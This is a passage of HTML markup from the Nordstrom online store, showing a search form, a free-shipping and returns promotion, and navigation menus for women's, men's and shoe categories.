				<a href="all-womens-sale?origin=header-left-promo" manual_cm_sp="event-_-corp_1224clearancesale-_-swpheaderleftP02_shop" title="Shop women&#39;s sale">Shop women's sale</a>.
			
	</p>
</section>
	</div>
	

	
	<div id="site-search">








<form id="keyword-search-form" class="search-form" method="get" action="/sr" role="search" aria-label="Search">

	<input id="keyword-search-origin" class="search-origin" name="origin" type="hidden" value="keywordsearch" />

		<input id="keyword-search-category-id" class="search-category-id" name="contextualcategoryid" type="hidden" value="0" />

	<div class="input-clear-wrapper">

		<label
			id="keyword-search-input-label"
			class="ada-hidden search-input-label"
			for="keyword-search-input"
			form="keyword-search-form">Search</label>
		<input
			id="keyword-search-input"
			class="search-input"
			aria-labelledby="keyword-search-input-label"
			name="keyword"
			title="Search Term"
			type="search"
			data-predictive-search-enabled="true"
			placeholder="Search by keyword or item #"
			autocomplete="off">

		<label
			id="keyword-search-reset-label"
			class="ada-hidden search-reset-label"
			for="keyword-search-reset"
			form="keyword-search-form">Clear</label>
		<button
			id="keyword-search-reset"
			class="input-clear-button sprite sprite-clear-sm ir hidden"
			aria-labelledby="keyword-search-reset-label"
			type="reset">Clear</button>

	</div>

	<label
		id="keyword-search-submit-label"
		class="ada-hidden search-submit-label"
		for="keyword-search-submit"
		form="keyword-search-form">Search</label>
	<button
		id="keyword-search-submit"
		class="search-submit button button-primary ir"
		aria-labelledby="keyword-search-submit-label"
		tabindex="0"
		type="submit">Search</button>

	<section id="keyword-search-flyout" class="search-flyout">
	</section>

</form>



		




<section id="image-promotion-searchpromo" class="image-promo">



<a class="js-popover-link" data-popover-id="promotion-popover-searchpromo" href="free-shipping?origin=header-right-promo" id="free-shipping-promotion-link" manual_cm_sp="merch-_-corp_freeshipping-_-swpheaderrightunder_info" title="See details"><img alt="FREE SHIPPING. FREE RETURNS. ALL THE TIME." src="http://c.nordstromimage.com/Assets/IDEV/common/promos/free-shipping-under-search-7-adam-dbc283bd-7c5f-4aed-80c9-a1900182c725-fil-file.png?Version=1"></img></a>			<aside id="promotion-popover-searchpromo" class="promo-detail popover below arrow-mid-right">
			<div class="popover-content">
				<button class="popover-close">Close</button>
				<p xmlns="http://www.w3.org/1999/xhtml"><strong>Our policy is simple:</strong> We'll ship almost anything on our site to anywhere in the United States—even Alaska and Hawaii—for free. No minimums. No kidding.</p><p xmlns="http://www.w3.org/1999/xhtml"><strong>Don't love it?</strong> Return it for free, too. We mean it.</p>
						<ul class="promo-detail-links">
								<li><a href="/c/shipping-options?origin=header-right-promo-details" title="More Shipping Options">More Shipping Options</a></li>
								<li><a href="https://secure.nordstrom.com/ReturnsAndExchange.aspx?origin=header-right-promo-details" title="Returns &amp; Exchanges">Returns & Exchanges</a></li>
						</ul>

				<footer class="disclaimer">
					<p xmlns="http://www.w3.org/1999/xhtml">International orders and Nordstrom Rack stores aren't eligible for free shipping. For Nordstrom Rack returns, please refer to the <a title="Nordstrom Rack Return Policy" href="https://www.nordstromrack.com/ship-return-policy">Nordstrom Rack Return Policy</a>.</p>
				</footer>
			</div>
		</aside>
</section>
	</div>
	

















<nav id="primary-nav" class="primary-navigation" role="navigation" aria-label="Site Navigation">
	<ul role="tablist" class="clearfix">
				<li id="primary-nav-women" class="tab  js-pending-setup">
					<h2 role="presentation">
						<a id="women-tab" href="http://shop.nordstrom.com/c/women?dept=8000001&amp;origin=topnav" title="Women" aria-controls="women-panel" manual_cm_sp="Top Navigation-_-Women-_-Women">
							<span>Women</span>
						</a>
					</h2>
					<div id="women-panel" aria-labelledby="women-tab" class="nav-category nav-column-3">
							<div class="nav-category-column">
												<h3 class="nav-entry-clothing"><a href="http://shop.nordstrom.com/c/womens-clothing?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing">Clothing</a></h3>
			<ul>
				<li class="nav-entry-dresses"><a href="http://shop.nordstrom.com/c/womens-dresses-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Dresses">Dresses</a></li>
				<li class="nav-entry-coats"><a href="http://shop.nordstrom.com/c/womens-coats?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Coats">Coats</a></li>
				<li class="nav-entry-tops"><a href="http://shop.nordstrom.com/c/womens-tops-tees?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Tops">Tops</a></li>
				<li class="nav-entry-sweaters"><a href="http://shop.nordstrom.com/c/womens-sweaters?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Sweaters">Sweaters</a></li>
				<li class="nav-entry-jeans"><a href="http://shop.nordstrom.com/c/womens-jeans-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Jeans">Jeans</a></li>
				<li class="nav-entry-jackets"><a href="http://shop.nordstrom.com/c/jackets-for-women?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Jackets">Jackets</a></li>
				<li class="nav-entry-active,-yoga-outdoor"><a href="http://shop.nordstrom.com/c/womens-activewear-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Active, Yoga &amp; Outdoor">Active, Yoga &amp; Outdoor</a></li>
				<li class="nav-entry-shorts"><a href="http://shop.nordstrom.com/c/shorts-women?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Shorts">Shorts</a></li>
				<li class="nav-entry-pants"><a href="http://shop.nordstrom.com/c/womens-pants?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Pants">Pants</a></li>
				<li class="nav-entry-skirts"><a href="http://shop.nordstrom.com/c/womens-skirts?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Skirts">Skirts</a></li>
				<li class="nav-entry-bras,-panties-lingerie"><a href="http://shop.nordstrom.com/c/womens-underwear-lingerie?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Bras, Panties &amp; Lingerie">Bras, Panties &amp; Lingerie</a></li>
				<li class="nav-entry-shapewear"><a href="http://shop.nordstrom.com/c/womens-shapewear?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Shapewear">Shapewear</a></li>
				<li class="nav-entry-sleep,-lounge-robes"><a href="http://shop.nordstrom.com/c/womens-sleepwear-robes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Sleep, Lounge &amp; Robes">Sleep, Lounge &amp; Robes</a></li>
				<li class="nav-entry-swimsuits-cover-ups"><a href="http://shop.nordstrom.com/c/womens-swimsuits-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Swimsuits &amp; Cover-Ups">Swimsuits &amp; Cover-Ups</a></li>
				<li class="nav-entry-hosiery,-leggings-socks"><a href="http://shop.nordstrom.com/c/womens-hosiery-leggings-socks?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Hosiery, Leggings &amp; Socks">Hosiery, Leggings &amp; Socks</a></li>
					<li class="spacer-hack"></li>
				<li class="nav-entry-plus-size-clothing"><a href="http://shop.nordstrom.com/c/womens-plus-size-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Plus-Size Clothing">Plus-Size Clothing</a></li>
				<li class="nav-entry-petite-size-clothing"><a href="http://shop.nordstrom.com/c/womens-petite-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Petite-Size Clothing">Petite-Size Clothing</a></li>
				<li class="nav-entry-maternity-clothing"><a href="http://shop.nordstrom.com/c/maternity-clothes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Clothing_Maternity Clothing">Maternity Clothing</a></li>
					</ul>
			</div>
			<div class="nav-category-column">
				<h3 class="nav-entry-shoes"><a href="http://shop.nordstrom.com/c/womens-shoes-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Shoes">Shoes</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-handbags"><a href="http://shop.nordstrom.com/c/handbags-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Handbags">Handbags</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-accessories"><a href="http://shop.nordstrom.com/c/handbags-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Accessories">Accessories</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-beauty-fragrance"><a href="http://shop.nordstrom.com/c/beauty-makeup-perfume?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Beauty &amp; Fragrance">Beauty &amp; Fragrance</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-savvy-trends"><a href="http://shop.nordstrom.com/c/all-womens-savvy-trends?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Savvy Trends">Savvy Trends</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-the-wedding-suite"><a href="http://shop.nordstrom.com/c/wedding-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-The Wedding Suite">The Wedding Suite</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-designer-collections"><a href="http://shop.nordstrom.com/c/designer-collections?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Designer Collections">Designer Collections</a></h3>
			<ul>
				<li class="nav-entry-designer-clothing"><a href="http://shop.nordstrom.com/c/designer-clothing?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Designer Collections_Designer Clothing">Designer Clothing</a></li>
				<li class="nav-entry-designer-handbags"><a href="http://shop.nordstrom.com/c/designer-handbags?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Designer Collections_Designer Handbags">Designer Handbags</a></li>
				<li class="nav-entry-designer-shoes"><a href="http://shop.nordstrom.com/c/designer-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Designer Collections_Designer Shoes">Designer Shoes</a></li>
				<li class="nav-entry-jewelry-accessories"><a href="http://shop.nordstrom.com/c/designer-collections-jewelry-and-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Designer Collections_Jewelry &amp; Accessories">Jewelry &amp; Accessories</a></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					</ul>
			</div>
			<div class="nav-category-column">
			<ul>
				<li class="nav-entry-new-arrivals"><a href="http://shop.nordstrom.com/c/womens-new-arrivals?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Women_New Arrivals">New Arrivals</a></li>
				<li class="nav-entry-outfits"><a href="http://shop.nordstrom.com/c/womens-outfits?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Women_Outfits">Outfits</a></li>
				<li class="nav-entry-womens-brands"><a href="http://shop.nordstrom.com/c/womens-brands?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Women_Women&#39;s Brands">Women&#39;s Brands</a></li>
				<li class="nav-entry-sale"><a href="http://shop.nordstrom.com/c/all-womens-sale?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Women_Sale">Sale</a></li>
				<li class="nav-entry-nordstrom-gift-cards"><a href="http://shop.nordstrom.com/c/nordstrom-gift-cards?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Women_Nordstrom Gift Cards">Nordstrom Gift Cards</a></li>
					<li class="spacer-hack"></li>
			</ul>
					<h3 class="stylewatch nav-entry-style-watch">Style Watch</h3>
			<ul>
				<li class="nav-entry-our-blog"><a href="http://blogs.nordstrom.com/?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Women-_-Style Watch_Our Blog">Our Blog</a></li>
				<li class="nav-entry-mother-of-the-bride-dresses"><a href="http://shop.nordstrom.com/c/womens-mother-of-the-bride-dresses?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Style Watch_Mother of the Bride Dresses">Mother of the Bride Dresses</a></li>
				<li class="nav-entry-pop-in@nordstrom"><a href="http://shop.nordstrom.com/c/all-pop-in-olivia-kim?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Style Watch_Pop-In@Nordstrom">Pop-In@Nordstrom</a></li>
					<li class="spacer-hack"></li>
		</ul>
					<h3 class="nav-entry-featured-shops">Featured Shops</h3>
			<ul>
				<li class="nav-entry-topshop"><a href="http://shop.nordstrom.com/c/topshop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Women_Topshop">Topshop</a></li>
				<li class="nav-entry-contemporary"><a href="http://shop.nordstrom.com/c/womens-contemporary?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Women_Contemporary">Contemporary</a></li>
				<li class="nav-entry-the-t.b.d.-shop"><a href="http://shop.nordstrom.com/c/t-b-d?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Women_The t.b.d. Shop">The t.b.d. Shop</a></li>
				<li class="nav-entry-work"><a href="http://shop.nordstrom.com/c/womens-clothing-wear-to-work-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Women_Work">Work</a></li>
				<li class="nav-entry-cashmere"><a href="http://shop.nordstrom.com/c/womens-cashmere?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Women-_-Women_Cashmere">Cashmere</a></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
		</ul>

							</div>
					</div>
				</li>
				<li id="primary-nav-men" class="tab  js-pending-setup">
					<h2 role="presentation">
						<a id="men-tab" href="http://shop.nordstrom.com/c/men?dept=8000001&amp;origin=topnav" title="Men" aria-controls="men-panel" manual_cm_sp="Top Navigation-_-Men-_-Men">
							<span>Men</span>
						</a>
					</h2>
					<div id="men-panel" aria-labelledby="men-tab" class="nav-category nav-column-3">
							<div class="nav-category-column">
												<h3 class="nav-entry-clothing"><a href="http://shop.nordstrom.com/c/mens-clothing?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing">Clothing</a></h3>
			<ul>
				<li class="nav-entry-coats-jackets"><a href="http://shop.nordstrom.com/c/mens-coats-jackets?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Coats &amp; Jackets">Coats &amp; Jackets</a></li>
				<li class="nav-entry-suits-sport-coats"><a href="http://shop.nordstrom.com/c/mens-suits-sportcoats?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Suits &amp; Sport Coats">Suits &amp; Sport Coats</a></li>
				<li class="nav-entry-dress-shirts"><a href="http://shop.nordstrom.com/c/mens-dress-shirts-ties?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Dress Shirts">Dress Shirts</a></li>
				<li class="nav-entry-casual-button-down-shirts"><a href="http://shop.nordstrom.com/c/mens-shirts?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Casual Button-Down Shirts">Casual Button-Down Shirts</a></li>
				<li class="nav-entry-polos"><a href="http://shop.nordstrom.com/c/mens-polo-shirts?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Polos">Polos</a></li>
				<li class="nav-entry-t-shirts"><a href="http://shop.nordstrom.com/c/mens-tshirts?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_T-Shirts">T-Shirts</a></li>
				<li class="nav-entry-sweaters-sweatshirts"><a href="http://shop.nordstrom.com/c/mens-hoodies-fleece-sweaters?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Sweaters &amp; Sweatshirts">Sweaters &amp; Sweatshirts</a></li>
				<li class="nav-entry-tuxedos"><a href="http://shop.nordstrom.com/c/tuxedo-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Tuxedos">Tuxedos</a></li>
				<li class="nav-entry-pants"><a href="http://shop.nordstrom.com/c/mens-pants?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Pants">Pants</a></li>
				<li class="nav-entry-jeans"><a href="http://shop.nordstrom.com/c/mens-jeans?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Jeans">Jeans</a></li>
				<li class="nav-entry-shorts"><a href="http://shop.nordstrom.com/c/mens-shorts?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Shorts">Shorts</a></li>
				<li class="nav-entry-swimwear"><a href="http://shop.nordstrom.com/c/mens-swimwear?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Swimwear">Swimwear</a></li>
				<li class="nav-entry-workout,-outdoor-snow"><a href="http://shop.nordstrom.com/c/mens-workout-outdoor?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Workout, Outdoor &amp; Snow">Workout, Outdoor &amp; Snow</a></li>
				<li class="nav-entry-lounge-sleepwear"><a href="http://shop.nordstrom.com/c/mens-pajamas?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Lounge &amp; Sleepwear">Lounge &amp; Sleepwear</a></li>
				<li class="nav-entry-underwear-socks"><a href="http://shop.nordstrom.com/c/mens-underwear-socks?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Underwear &amp; Socks">Underwear &amp; Socks</a></li>
					<li class="spacer-hack"></li>
				<li class="nav-entry-big-tall"><a href="http://shop.nordstrom.com/c/mens-big-tall-clothing?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Big &amp; Tall">Big &amp; Tall</a></li>
				<li class="nav-entry-young-men"><a href="http://shop.nordstrom.com/c/young-mens?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Young Men">Young Men</a></li>
				<li class="nav-entry-sale"><a href="http://shop.nordstrom.com/c/all-mens-sale?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Clothing_Sale">Sale</a></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					</ul>
			</div>
			<div class="nav-category-column">
				<h3 class="nav-entry-shoes"><a href="http://shop.nordstrom.com/c/mens-shoes-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Shoes">Shoes</a></h3>
			<ul>
				<li class="nav-entry-athletic"><a href="http://shop.nordstrom.com/c/mens-athletic-shoes-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Shoes_Athletic">Athletic</a></li>
				<li class="nav-entry-boots"><a href="http://shop.nordstrom.com/c/men-boots?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Shoes_Boots">Boots</a></li>
				<li class="nav-entry-dress-shoes"><a href="http://shop.nordstrom.com/c/mens-dress-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Shoes_Dress Shoes">Dress Shoes</a></li>
				<li class="nav-entry-loafers-slip-ons"><a href="http://shop.nordstrom.com/c/mens-loafers-slip-ons?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Shoes_Loafers &amp; Slip-Ons">Loafers &amp; Slip-Ons</a></li>
				<li class="nav-entry-boat-shoes"><a href="http://shop.nordstrom.com/c/mens-boat-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Shoes_Boat Shoes">Boat Shoes</a></li>
				<li class="nav-entry-oxfords"><a href="http://shop.nordstrom.com/c/mens-oxfords?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Shoes_Oxfords">Oxfords</a></li>
				<li class="nav-entry-sandals-flip-flops"><a href="http://shop.nordstrom.com/c/mens-sandals?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Shoes_Sandals &amp; Flip-Flops">Sandals &amp; Flip-Flops</a></li>
				<li class="nav-entry-slippers"><a href="http://shop.nordstrom.com/c/mens-slippers?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Shoes_Slippers">Slippers</a></li>
				<li class="nav-entry-sneakers"><a href="http://shop.nordstrom.com/c/mens-sneakers?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Shoes_Sneakers">Sneakers</a></li>
				<li class="nav-entry-extended-sizes"><a href="http://shop.nordstrom.com/c/mens-special-size-shoes-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Shoes_Extended Sizes">Extended Sizes</a></li>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-grooming-cologne"><a href="http://shop.nordstrom.com/c/mens-grooming-cologne?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Grooming &amp; Cologne">Grooming &amp; Cologne</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-the-rail"><a href="http://shop.nordstrom.com/c/all-mens-rail?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-The Rail">The Rail</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-designer-collections"><a href="http://shop.nordstrom.com/c/mens-designer?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Designer Collections">Designer Collections</a></h3>
			<ul>
				<li class="nav-entry-designer-clothing"><a href="http://shop.nordstrom.com/c/mens-designer-collections?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Designer Collections_Designer Clothing">Designer Clothing</a></li>
				<li class="nav-entry-designer-accessories"><a href="http://shop.nordstrom.com/c/mens-designer-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Designer Collections_Designer Accessories">Designer Accessories</a></li>
				<li class="nav-entry-designer-shoes"><a href="http://shop.nordstrom.com/c/mens-designer-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Designer Collections_Designer Shoes">Designer Shoes</a></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					</ul>
			</div>
			<div class="nav-category-column">
				<h3 class="nav-entry-accessories"><a href="http://shop.nordstrom.com/c/mens-accessories-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Accessories">Accessories</a></h3>
			<ul>
				<li class="nav-entry-bags-wallets"><a href="http://shop.nordstrom.com/c/mens-bags-cases?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Accessories_Bags &amp; Wallets">Bags &amp; Wallets</a></li>
				<li class="nav-entry-belts-suspenders"><a href="http://shop.nordstrom.com/c/mens-belts-suspenders?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Accessories_Belts &amp; Suspenders">Belts &amp; Suspenders</a></li>
				<li class="nav-entry-watches"><a href="http://shop.nordstrom.com/c/mens-watches?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Accessories_Watches">Watches</a></li>
				<li class="nav-entry-ties-pocket-squares"><a href="http://shop.nordstrom.com/c/mens-ties?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Accessories_Ties &amp; Pocket Squares">Ties &amp; Pocket Squares</a></li>
				<li class="nav-entry-sunglasses"><a href="http://shop.nordstrom.com/c/mens-sunglasses?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Accessories_Sunglasses">Sunglasses</a></li>
				<li class="nav-entry-audio,-tech-home"><a href="http://shop.nordstrom.com/c/mens-tech-accessories-gadgets?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Accessories_Audio, Tech &amp; Home">Audio, Tech &amp; Home</a></li>
				<li class="nav-entry-scarves,-hats-gloves"><a href="http://shop.nordstrom.com/c/mens-hats-gloves-scarves?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Accessories_Scarves, Hats &amp; Gloves">Scarves, Hats &amp; Gloves</a></li>
				<li class="nav-entry-jewelry-cuff-links"><a href="http://shop.nordstrom.com/c/mens-cuff-links-jewelry?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Accessories_Jewelry &amp; Cuff Links">Jewelry &amp; Cuff Links</a></li>
				<li class="nav-entry-luggage-travel"><a href="http://shop.nordstrom.com/c/mens-luggage?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Men-_-Accessories_Luggage &amp; Travel">Luggage &amp; Travel</a></li>
		</ul>

							</div>
					</div>
				</li>
				<li id="primary-nav-shoes" class="tab  js-pending-setup">
					<h2 role="presentation">
						<a id="shoes-tab" href="http://shop.nordstrom.com/c/shoes-shop?dept=8000001&amp;origin=topnav" title="Shoes" aria-controls="shoes-panel" manual_cm_sp="Top Navigation-_-Shoes-_-Shoes">
							<span>Shoes</span>
						</a>
					</h2>
					<div id="shoes-panel" aria-labelledby="shoes-tab" class="nav-category nav-column-3">
							<div class="nav-category-column">
												<h3 class="nav-entry-women"><a href="http://shop.nordstrom.com/c/womens-shoes-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women">Women</a></h3>
			<ul>
				<li class="nav-entry-all-womens-shoes"><a href="http://shop.nordstrom.com/c/womens-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women_All Women&#39;s Shoes">All Women&#39;s Shoes</a></li>
				<li class="nav-entry-athletic"><a href="http://shop.nordstrom.com/c/womens-athletic-shoes-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women_Athletic">Athletic</a></li>
				<li class="nav-entry-booties"><a href="http://shop.nordstrom.com/c/booties?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women_Booties">Booties</a></li>
				<li class="nav-entry-boots"><a href="http://shop.nordstrom.com/c/womens-boots?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women_Boots">Boots</a></li>
				<li class="nav-entry-comfort"><a href="http://shop.nordstrom.com/c/womens-comfort-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women_Comfort">Comfort</a></li>
				<li class="nav-entry-evening"><a href="http://shop.nordstrom.com/c/womens-evening-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women_Evening">Evening</a></li>
				<li class="nav-entry-flats"><a href="http://shop.nordstrom.com/c/womens-flats?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women_Flats">Flats</a></li>
				<li class="nav-entry-pumps"><a href="http://shop.nordstrom.com/c/womens-pumps?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women_Pumps">Pumps</a></li>
				<li class="nav-entry-sandals"><a href="http://shop.nordstrom.com/c/womens-sandals-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women_Sandals">Sandals</a></li>
				<li class="nav-entry-slippers"><a href="http://shop.nordstrom.com/c/womens-slippers?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women_Slippers">Slippers</a></li>
				<li class="nav-entry-sneakers"><a href="http://shop.nordstrom.com/c/womens-sneakers?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women_Sneakers">Sneakers</a></li>
				<li class="nav-entry-wedges"><a href="http://shop.nordstrom.com/c/wedges-for-women?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women_Wedges">Wedges</a></li>
				<li class="nav-entry-wides-narrows"><a href="http://shop.nordstrom.com/c/womens-special-size-shoes-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women_Wides &amp; Narrows">Wides &amp; Narrows</a></li>
					<li class="spacer-hack"></li>
				<li class="nav-entry-designer-shoes"><a href="http://shop.nordstrom.com/c/designer-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women_Designer Shoes">Designer Shoes</a></li>
				<li class="nav-entry-sale"><a href="http://shop.nordstrom.com/c/sale-womens-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Women_Sale">Sale</a></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					</ul>
			</div>
			<div class="nav-category-column">
				<h3 class="nav-entry-men"><a href="http://shop.nordstrom.com/c/mens-shoes-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Shoes-_-Men">Men</a></h3>
			<ul>
